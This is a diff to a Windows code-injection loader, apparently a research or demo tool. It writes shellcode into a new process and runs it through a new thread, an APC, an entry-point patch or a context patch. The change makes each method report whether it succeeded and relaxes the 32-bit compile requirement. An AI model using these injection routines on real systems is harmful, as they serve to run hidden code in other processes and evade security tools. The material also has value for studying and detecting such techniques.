@@ -42,21 +42,22 @@ bool inject_in_new_process(INJECTION_POINT mode)
         return false;
     }
     LPVOID remote_shellcode_ptr = map_buffer_into_process1(pi.hProcess, g_Shellcode, sizeof(g_Shellcode), PAGE_EXECUTE_READWRITE);
+    bool result = false;
     switch (mode) {
     case ADD_THREAD:
-        run_shellcode_in_new_thread(pi.hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
+        result = run_shellcode_in_new_thread(pi.hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
         // not neccessery to resume the main thread
         break;
     case ADD_APC:
-        add_shellcode_to_apc(pi.hThread, remote_shellcode_ptr);
+        result = add_shellcode_to_apc(pi.hThread, remote_shellcode_ptr);
         ResumeThread(pi.hThread); //resume the main thread
         break;
     case PATCH_EP:
-        paste_shellcode_at_ep(pi.hProcess, remote_shellcode_ptr);
+        result = paste_shellcode_at_ep(pi.hProcess, remote_shellcode_ptr, pi.hThread);
         ResumeThread(pi.hThread); //resume the main thread
         break;
     case PATCH_CONTEXT:
-        patch_context(pi.hThread, remote_shellcode_ptr);
+        result = patch_context(pi.hThread, remote_shellcode_ptr);
         ResumeThread(pi.hThread); //resume the main thread
         break;
     }
@@ -64,7 +65,7 @@ bool inject_in_new_process(INJECTION_POINT mode)
     //close handles
     ZwClose(pi.hThread);
     ZwClose(pi.hProcess);
-    return true;
+    return result;
 }
 
 bool inject_in_existing_process()
@@ -93,9 +94,7 @@ int main()
         printf("[WARNING] Your ystem is NOT 32 bit! Some of the methods may not work.\n");
     }
     if (!is_compiled_32b()) {
-        printf("[ERROR] Not supported! Compile the loader as a 32 bit application!\n");
-        system("pause");
-        return (-1);
+        printf("[WARNING] It is recommended to compile the loader as a 32 bit application!\n");
     }
 
     // choose the method:
@@ -103,7 +102,7 @@ int main()
     switch (targetType) {
     case TARGET_TYPE::TRAY_WINDOW:
         if (!is_system32b()) {
-            printf("[ERROR] Not supported! Your ystem is NOT 32 bit!\n");
+            printf("[ERROR] Not supported! Your system is NOT 32 bit!\n");
             break;
         }
         // this injection is more fragile, use shellcode that makes no assumptions about the context
